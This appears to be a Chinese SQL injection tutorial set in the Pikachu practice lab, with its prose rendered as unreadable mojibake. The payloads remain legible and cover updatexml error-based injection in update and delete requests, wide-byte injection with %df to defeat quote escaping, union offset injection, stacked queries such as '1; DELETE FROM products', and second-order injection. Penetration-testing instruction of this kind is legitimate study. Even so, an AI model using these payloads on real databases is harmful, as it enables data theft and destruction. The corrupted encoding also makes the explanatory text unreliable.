çœ‹pikachuï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åç™»å½• çœ‹åˆ°å¦‚ä¸‹é¡µé¢ï¼Œç‚¹å‡»ä¿®æ”¹ä¸ªäººä¿¡æ¯ å¦‚ä¸‹é¡µé¢ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹æ‰‹æœºå·ï¼Œç„¶åç‚¹å‡»submitï¼Œé€šè¿‡burpæŠ“åŒ…ä¸€ä¸‹çœ‹çœ‹ ä¸Šé¢æˆ‘ä»¬çœ‹åˆ°æœ‰å››ä¸ªæ•°æ®å‘é€åˆ°äº†åå°ï¼Œä½†æ˜¯ç›®å‰ä¸çŸ¥é“å“ªä¸ªæ˜¯æ³¨å…¥ç‚¹ï¼Œéœ€è¦ä¸€ä¸ªä¸ªçš„æµ‹ï¼Œç»æµ‹è¯•å‘ç° æ‰‹æœºå·æœ‰ä¸ªæ³¨å…¥ç‚¹ï¼š updateæ³¨å…¥ï¼š or updatexml(0,concat(0x7e,(select database())),0) or 3ï¼Œdeleteæ³¨å…¥èˆ¬åº”ç”¨äºå‰åç«¯å‘è´´ã€ç•™è¨€ã€ç”¨æˆ·ç­‰ç›¸å…³åˆ é™¤æ“ä½œï¼Œç‚¹å‡»åˆ é™¤æŒ‰é’®æ—¶å¯é€šè¿‡Brup SuiteæŠ“åŒ…ï¼Œå¯¹æ•°æ®åŒ…ç›¸å…³deleteå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œä¸€èˆ¬æ™®é€šçš„ç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™åˆ é™¤æ•°æ®çš„ï¼Œç®¡ç†å‘˜æ‰è¡Œã€‚ pikachuä¸­çœ‹æ•ˆæœï¼Œæˆ‘ä»¬å…ˆåšå‡ æ¡ç•™è¨€ï¼Œæ–¹ä¾¿åˆ é™¤çš„æ—¶å€™ç”¨ ä½ ä¼šå‘ç°æ¯ä¸ªåˆ é™¤æŒ‰é’®å…¶å®éƒ½å¯¹åº”ä¸€ä¸ªç½‘å€ï¼Œç‚¹å‡»åˆ é™¤å°±å¾€åå°å‘é€è¯·æ±‚ æˆ‘ä»¬é€šè¿‡burpæŠ“åŒ…çœ‹çœ‹æ•ˆæœ å¥½ï¼Œå¼€å§‹æ³¨å…¥ï¼Œæ³¨å…¥æ–¹æ³•å¦‚ä¸‹ï¼š deletefrom message where id=56 or updatexml(2,concat(0x7e,(database())),0) #æ³¨æ„è¿™æ˜¯ä¸ªæ•°å­—å‹æ³¨å…¥ï¼Œæ‰€ä»¥ä¸è¦å¼•å·æ˜‚56%20or%20updatexml(2,concat(0x7e,(database())),0) ç©ºæ ¼ç¼–ç äº† æ•ˆæœï¼Œç›´æ¥åœ¨åœ°å€æ è¾“å…¥æ³¨å…¥å³å¯çœ‹åˆ°ã€‚ 6ï¼Œå®½å­—èŠ‚æ³¨å…¥1ï¼Œæ³¨å…¥é˜²å¾¡ä¹‹å¼•å·è½¬ä¹‰å’Œç»•è¿‡æ€è·¯å¥½å¤šç½‘ç«™ï¼Œå°¤å…¶æ˜¯phpçš„ç½‘ç«™ï¼Œä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œç»å¸¸ä¼šé‡‡ç”¨ä¸€ä¸ªæ‰‹æ®µå°±æ˜¯å¼•å·è½¬ä¹‰ï¼Œæ¯”å¦‚å¼€å¯å…¨å±€GPCé…ç½®ï¼Œå¦‚ä¸‹phpstudyä¸­å¼€å¯ï¼š ä¹Ÿå°±æ˜¯php.inié…ç½®æ–‡ä»¶ä¸­æ·»åŠ magic_quotes_gpconã€‚æˆ–è€…æ˜¯ä½¿ç”¨ä¸€äº›è½¬ä¹‰å‡½æ•°ï¼Œæ¯”å¦‚ï¼šaddslasheså’Œmysql_real_escape_stringï¼Œä»–ä»¬è½¬ä¹‰çš„å­—ç¬¦æ˜¯å•å¼•å·(â€˜)ã€åŒå¼•å·(â€œ)ã€åæ–œçº¿()ä¸NUL(NULL å­—ç¬¦)ï¼Œè½¬ä¹‰çš„æ–¹å¼å°±æ˜¯åœ¨è¿™äº›ç¬¦å·å‰é¢è‡ªåŠ¨åŠ ä¸Š \\ ï¼Œè®©è¿™äº›ç¬¦å·çš„æ„ä¹‰å¤±æ•ˆï¼Œæˆ–è€…å¯ä»¥ç†è§£ä¸ºè¢«æ³¨é‡Šæ‰äº†ã€‚ ç¼–ç è½¬æ¢å·¥å…·ï¼šhttps://tool.chinaz.com/tools/urlencode.aspx é‚£ä¹ˆæˆ‘ä»¬çš„sqlæ³¨å…¥è¯­å¥å°±è·Ÿç€å¤±æ•ˆäº†ï¼Œå› ä¸ºå¥½å¤šæ—¶å€™ï¼Œæˆ‘ä»¬å†™æ³¨å…¥è¯­å¥éš¾å…ä¼šä½¿ç”¨åˆ°å¼•å·ç­‰ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ª http://192.168.2.109/pikachu/vul/sqli/sqli_str.php?name=xx%27+or+1%3D1%23submit=%E6%9F%A5%E8%AF%A2name=xx%27+or+1%3D1%23å…¶å®å°±æ˜¯name=xxor 1=1#è¿›è¡Œäº†urlç¼–ç ä¹‹åçš„æ•ˆæœã€‚å¦‚æœåå°æ‰§è¡Œçš„sqlè¯­å¥ä¸º$uname = $_GET(name)select * from member where username=$uname;## å†æ³¨å…¥è¿™æ ·çš„è¯­å¥æ—¶ï¼Œç”±äºè¢«è½¬ä¹‰äº†ï¼Œå¾—åˆ°çš„sqlè¯­å¥å°†æ˜¯å¦‚ä¸‹æ•ˆæœçš„select * from member where username=xxx\\or 1=1#;ï¼Œ## åé¢çš„å¼•å·è¢«è½¬ä¹‰ï¼Œå¯¼è‡´ä¸èƒ½å’Œå‰é¢çš„å¼•å·é—­åˆä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªsqlè¯­å¥çš„è¯­æ³•å°±æ˜¯é”™è¯¯çš„ï¼Œæ‰€æœ‰ä¸ä¼šè¾¾åˆ°æ³¨å…¥çš„æ•ˆæœï¼Œè¿™å°±æ˜¯é˜²å¾¡çš„æ‰‹æ®µã€‚ è¿™æ ·å°±æ²¡æœ‰åŠæ³•äº†ï¼Œä¸æ˜¯çš„ï¼Œè¿˜å¯ä»¥å°è¯•å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬æä¸€ä¸‹ï¼Œä¸Šé¢çš„è¯­å¥å…¶å®åº”è¯¥æ˜¯è¿™æ ·çš„ $uname = $_GET(name) -- $unameå…¶å®ç­‰äº xxx%27+or+1%3D1+%23,## ä½†æ˜¯æˆ‘ä»¬è¦è§£ç å•Šï¼Œæ‰€ä»¥ï¼Œå…¶å®åå°è·å¾—çš„è¿™ä¸ª$unameå˜é‡æ•°æ®å®é™…ä¸Šæ˜¯xxx0x27+or+10x3D1+0x23ï¼Œå› ä¸º%æ˜¯urlç¼–ç æ—¶åå…­è¿›åˆ¶æ•°æ®çš„å‰ç¼€0xçš„ç®€å†™ã€‚## åå°è½¬ä¹‰å•å¼•å·çš„æ—¶å€™ï¼Œå…¶å®åœ¨å‰é¢åŠ ä¸Š\\çš„æ—¶å€™ï¼ŒåŠ çš„æ˜¯\\çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œè€Œ\\çš„åå…­è¿›åˆ¶ç¼–ç ä¸º0x5C,ä¹Ÿå°±æ˜¯è¯´xxx0x27è¿™ä¸ªæ•°æ®ï¼Œå…¶å®åˆ°åå°åŠ ä¸Šè½¬ä¹‰ä¹‹åï¼Œæ˜¯xxx0x5C0x27,é‚£ä¹ˆå‘æ•£æ€è·¯ï¼Œæˆ‘ä»¬å¯èƒ½å°±ä¼šæƒ³åˆ°ï¼Œç”±äºæ±‰å­—åœ¨GBKç¼–ç çš„æ—¶å€™æ˜¯ä¸¤ä¸ªåå…­è¿›åˆ¶çš„å­—èŠ‚ï¼ŒUTF8æ˜¯ä¸‰ä¸ªå­—èŠ‚ï¼Œè€Œè¿™ä¸ª\\æ˜¯ä¸€ä¸ªå­—èŠ‚0x5cï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå†æä¾›ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªåå…­è¿›åˆ¶çš„å­—èŠ‚æ•°æ®å’Œè¿™ä¸ª0x5cå¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ªæ±‰å­—çš„ç¼–ç çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸ª\\ä¸å°±è¢«æˆ‘ä»¬åƒæ‰äº†å—ï¼Ÿé‚£ä¹ˆå•å¼•å·å°±åˆå¯ä»¥ç”Ÿæ•ˆäº†ã€‚ 2ï¼Œæ³¨å…¥æµ‹è¯• å…¶ä¸­ï¼Œæˆ‘åœ¨%27å‰é¢åŠ ä¸Šäº†ä¸€ä¸ª%dfï¼Œä¹Ÿå°±æ˜¯0xdfï¼Œåˆ°äº†åå°ä¹‹åå•å¼•å·å‰é¢åŠ ä¸Šäº†0x5cï¼Œç„¶åurlè§£ç ï¼Œå¦‚ä¸‹ xxx0xdf0x5C0x27+or+10x3D1+0x23## æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å¦‚ä¸‹select * from member where username=xxx0xdf0x5C0x27+or+10x3D1+0x23;æ³¨å…¥å¦‚ä¸‹ï¼šxx%df%27+or+1%3D1%23 ------ xx%df or 1=1# é‚£ä¹ˆçœ‹ä¸€ä¸‹åå°ä»£ç  ç”±äºä»£ç ä¸­è®¾ç½®äº†set character_set_clientâ€™gbkâ€™ï¼Œé‚£ä¹ˆå°†åˆšæ‰æ‹¼æ¥å¥½çš„sqlè¯­å¥å‘é€ç»™mysqlçš„æ—¶å€™ï¼Œé‡‡ç”¨çš„gbkç¼–ç ï¼Œé‚£ä¹ˆsqlè¯­å¥å°±ä¼šå˜ä¸ºå¦‚ä¸‹ï¼š select * from member where username=xxx0xdf0x5C0x27+or+10x3D1+0x23;GBKç¼–ç çš„æ•°æ®åº“ï¼Œä¼šå°†0xdf0x5cè¯†åˆ«ä¸ºé‹å­—ï¼Œè¿™æ ·\\è¢«0xdfç»™åƒæ‰äº†ï¼Œå˜æˆäº†ä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·çš„è¯ï¼Œå•å¼•å·å°±æœ‰æ•ˆäº†ï¼Œå°±å¯ä»¥é—­åˆå‰é¢çš„å¼•å·äº†ï¼Œåé¢çš„or 1=1#è¿™æ ·çš„æ³¨å…¥è¯­å¥åˆèƒ½æˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹ï¼šselect * from member where username = chaoé‹ or 1=1 #` -- ä»€ä¹ˆéƒ½æŸ¥è¯¢åˆ°äº† æ•´ç†ä¸€ä¸‹è¯·æ±‚ç½‘å€å’Œsqlè¯­å¥ï¼Œå¦‚ä¸‹ ## è¯·æ±‚ï¼š http://www.jaden.cn/?username=chao #æ­£å¸¸è¯·æ±‚ http://www.jaden.cn/?username=chao or 1=1 # #æ³¨å…¥è¯­å¥ http://www.jaden.cn/?username=chao\\ or 1=1 # #å•å¼•å·å‰é¢è¢«è‡ªåŠ¨åŠ ä¸Šäº†\\è¿›è¡Œäº†è½¬ä¹‰ï¼Œå•å¼•å·å¤±æ•ˆ ## åå°æ‹¼æ¥çš„sqlè¯­å¥ï¼š select * from member where username=chao; #æ­£å¸¸æŸ¥è¯¢ select * from member where username = chao or 1=1 # #æ³¨å…¥æˆåŠŸçš„ select * from member where username = chao\\ or 1=1 # #\\è½¬ä¹‰ä¹‹åçš„sqlè¯­å¥ ## urlç¼–ç ä¹‹åçš„è¯·æ±‚å’Œsqlè¯­å¥å†™æ³• http://www.jaden.cn/?username=chao%5c or 1=1 # getè¯·æ±‚æºå¸¦æ•°æ®æ—¶ï¼Œä¸€èˆ¬ä¼šè‡ªåŠ¨è¿›è¡Œurlç¼–ç ï¼Œ\\ç¼–ç ä¸º%5C select * from member where username = chao%5c or 1=1 ### å¦‚æœåå°æ•°æ®åº“çš„ç¼–ç ä¸ºGBKï¼Œé‚£ä¹ˆå°è¯•å®½å­—èŠ‚æ³¨å…¥ï¼Œåœ¨å¼•å·å‰é¢åŠ ä¸Š%df http://www.jaden.cn/?username=chao%df%5c or 1=1 ### å®½å­—èŠ‚æ³¨å…¥ä¹‹åï¼Œæ‹¼æ¥çš„sqlè¯­å¥ select * from member where username = chao%df%5c or 1=1 ### GBKç¼–ç çš„æ•°æ®åº“ï¼Œä¼šå°†%df%5cè¯†åˆ«ä¸ºé‹å­—ï¼Œè¿™æ ·\\è¢«%dfç»™åƒæ‰äº†ï¼Œå˜æˆäº†ä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·çš„è¯ï¼Œå•å¼•å·å°±æœ‰æ•ˆäº†ï¼Œå°±å¯ä»¥é—­åˆå‰é¢çš„å¼•å·äº†ï¼Œåé¢çš„or 1=1#è¿™æ ·çš„æ³¨å…¥è¯­å¥åˆèƒ½æˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹ï¼š select * from member where username = chaoé‹ or 1=1 #` -- ä»€ä¹ˆéƒ½æŸ¥è¯¢åˆ°äº† 7ï¼Œåç§»é‡æ³¨å…¥åŸç†ï¼š åç§»æ³¨å…¥æ˜¯ä¸€ç§æ³¨å…¥å§¿åŠ¿ï¼Œå¯ä»¥æ ¹æ®ä¸€ä¸ªè¾ƒå¤šå­—æ®µçš„è¡¨å¯¹ä¸€ä¸ªå°‘å­—æ®µçš„è¡¨è¿›è¡Œåç§»æ³¨å…¥ï¼Œä¸€èˆ¬æ˜¯è”åˆæŸ¥è¯¢ï¼Œåœ¨é¡µé¢æœ‰å›æ˜¾ç‚¹çš„æƒ…å†µä¸‹ã€‚åç§»æ³¨å…¥ç°åœ¨ç”¨çš„ä¸å¤šäº†ï¼Œå› ä¸ºæœ‰æ—¶å€™ä¸å¤ªå¥½ç”¨æ˜‚ï¼Œç¤ºä¾‹ä¸­æœ‰æåŠã€‚ åœ¨SQLæ³¨å…¥çš„æ—¶å€™ä¼šé‡åˆ°ä¸€äº›æ— æ³•æŸ¥è¯¢åˆ—åçš„é—®é¢˜ï¼Œæ¯”å¦‚ç³»ç»Ÿè‡ªå¸¦æ•°æ®åº“çš„æƒé™ä¸å¤Ÿè€Œæ— æ³•è®¿é—®ç³»ç»Ÿè‡ªå¸¦åº“ã€‚ å½“ä½ çŒœåˆ°è¡¨åæ— æ³•çŒœåˆ°å­—æ®µåçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åç§»æ³¨å…¥æ¥æŸ¥è¯¢é‚£å¼ è¡¨é‡Œé¢çš„æ•°æ®ã€‚ ## å‡è®¾ä¸€ä¸ªè¡¨æœ‰8ä¸ªå­—æ®µï¼Œadminè¡¨æœ‰3ä¸ªå­—æ®µã€‚è”åˆæŸ¥è¯¢payloadï¼šunion select 1,2,3,4,5,6,7,8 from admin åœ¨æˆ‘ä»¬ä¸çŸ¥é“adminæœ‰å¤šå°‘å­—æ®µçš„æƒ…å†µä¸‹å¯ä»¥å°è¯•payloadï¼šunion select 1,2,3,4,5,6,7,admin.* ## from adminï¼Œæ­¤æ—¶é¡µé¢å‡ºé”™ç›´åˆ°payloadï¼šunion select 1,2,3,4,5,admin.* from adminæ—¶é¡µé¢è¿”å›æ­£å¸¸ï¼Œè¯´æ˜adminè¡¨æœ‰ä¸‰ä¸ªå­—æ®µ é‚£ä¹ˆï¼Œå¦‚æœé¡µé¢ä¸Šæ˜¾ç¤ºçš„2ï¼Œ3ï¼Œ4è¿™ä¸‰ä¸ªå­—æ®µæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†admin.æå‰ï¼Œæ¯”å¦‚ union select 1,admin.,2,3,4,5 from admin ï¼Œé‚£ä¹ˆadminè¡¨çš„æ•°æ®åœ¨ä¸çŸ¥é“å­—æ®µåç§°çš„æƒ…å†µä¸‹å°±è¢«å›æ˜¾å‡ºæ¥äº†ã€‚ æµ‹è¯•ï¼š ä¿®æ”¹ä¸€ä¸‹ä»£ç æ–‡ä»¶ï¼š ç„¶åæŠ“åŒ…ï¼Œæ·»åŠ åç§»é‡æ³¨å…¥çš„è¯­å¥ï¼š 8ï¼Œå…¶ä»–æ³¨å…¥æ‰‹æ®µ1ï¼ŒåŠ å¯†æ³¨å…¥å‰ç«¯æäº¤çš„æœ‰äº›æ•°æ®æ˜¯åŠ å¯†ä¹‹åï¼Œåˆ°äº†åå°åœ¨è§£å¯†ï¼Œç„¶åå†è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ç­‰ç›¸å…³æ“ä½œçš„ï¼Œé‚£ä¹ˆæ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬ä¹Ÿåº”è¯¥å°†æ³¨å…¥è¯­å¥æŒ‰ç…§ç›¸åŒçš„åŠ å¯†æ–¹å¼ï¼ŒåŠ å¯†ä¹‹åå†è¿›è¡Œæ³¨å…¥ï¼Œæ¯”å¦‚ï¼Œçœ‹æœç‹è¿™ä¸ªç½‘å€ï¼š ä¸¤ä¸ª ç»“å°¾ï¼Œä¸€èˆ¬æ˜¯base64åŠ å¯†çš„ï¼Œæˆ‘ä»¬è§£å¯†çœ‹çœ‹æ•ˆæœ å¦‚æœæƒ³æ„é€ æ³¨å…¥çš„è¯ï¼Œæˆ‘ä»¬åº”è¯¥è¿™æ · ç„¶åå°†åŠ å¯†ä¹‹åçš„æ•°æ®æ›¿æ¢åˆ°åŸç½‘å€ä½ç½®ç„¶åå‘é€è¯·æ±‚ã€‚è¿™ä¸ªå¤§å®¶çŸ¥é“æ„æ€å³å¯ï¼Œæœç‹è¿™é‡Œè‚¯å®šæ˜¯æ²¡æœ‰æ³¨å…¥ç‚¹çš„æ˜‚ã€‚ 2ï¼Œå †å æ³¨å…¥åŸç†ï¼š ## åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡ SQL è¯­å¥ï¼Œè¯­å¥ä¹‹é—´ä»¥åˆ†å·(;)éš”å¼€ï¼Œè€Œå †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»å°±æ˜¯åˆ©ç”¨æ­¤ç‰¹ç‚¹ï¼Œåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­æ„é€ è¦æ‰§è¡Œæ”»å‡»çš„è¯­å¥ã€‚ä½†æ˜¯å †å æŸ¥è¯¢åªèƒ½è¿”å›ç¬¬ä¸€æ¡æŸ¥è¯¢ä¿¡æ¯ï¼Œä¸è¿”å›åé¢çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ã€‚## åœ¨ mysql ä¸­phpçš„å‡½æ•°é‡Œé¢ mysqli_multi_query å’Œ mysql_multi_queryè¿™ä¸¤ä¸ªå‡½æ•°ï¼ˆå‡½æ•°ä¹Ÿå«åšAPIï¼‰æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚å †å æ³¨å…¥çš„å±å®³æ˜¯å¾ˆå¤§ï¼Œå¯ä»¥ä»»æ„ä½¿ç”¨å¢åˆ æ”¹æŸ¥çš„è¯­å¥ï¼Œä¾‹å¦‚åˆ é™¤æ•°æ®åº“ ä¿®æ”¹æ•°æ®åº“ï¼Œæ·»åŠ æ•°æ®åº“ç”¨æˆ·ã€‚ä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œå¾€å¾€è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥è¯´å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œä¸€æ—¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå°†å¯¹æ•°æ®å®‰å…¨é€ æˆé‡å¤§å¨èƒã€‚## é™åˆ¶ï¼šå †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚## mysqlä¸­æœ‰äº›APIæ˜¯æ”¯æŒçš„ï¼Œsqlserveréƒ½æ”¯æŒï¼Œoracleä¸æ”¯æŒã€‚ 3ï¼ŒäºŒæ¬¡æ³¨å…¥## è¿™ä¸ªæ¼æ´åŸºæœ¬ä¸Šé»‘ç›’æµ‹è¯•æ˜¯å¾ˆéš¾å‘ç°çš„ï¼ŒåŸºæœ¬éƒ½æ˜¯ä»£ç å®¡è®¡å‡ºæ¥çš„ï¼Œæ‰¾ç¨‹åºä»£ç ä¸­æ“ä½œæ•°æ®åº“ä¸­æ•°æ®çš„åœ°æ–¹ï¼Œçœ‹ä¸€ä¸‹ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®æ˜¯å¦è¿›è¡Œäº†è„æ•°æ®è¿‡æ»¤ã€‚## äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚## äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼Œä»¥phpä»£ç æ¥ä¸¾ä¾‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº†addslashes æˆ–è€…æ˜¯å€ŸåŠ© get_magic_quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œæ¯”å¦‚å•å¼•å·æ•°æ®ï¼Œè™½ç„¶ç›´æ¥æ³¨å…¥æ—¶æ•ˆäº†ï¼Œä½†æ˜¯æ•°æ®å†™å…¥åˆ°äº†æ•°æ®åº“ï¼Œæ•°æ®åº“ä¸­å­˜çš„è¿™ä¸ªæ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¾ˆå¤šå¼€å‘è€…éƒ½ä¼šè®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥ ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ® è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ® å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ ç¤ºæ„å›¾ phpæœ€è¡¨å•æ•°æ®è½¬ä¹‰ç”¨çš„å‡½æ•°ï¼Œä½†æ˜¯ä¿å­˜åˆ°æ•°æ®åº“é‡Œé¢ä¼šå»æ‰è½¬ä¹‰ mysqli_query # ç”¨è¿™ä¸ªå‡½æ•°æ‰§è¡ŒSQLè¯­å¥é»˜è®¤ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼ 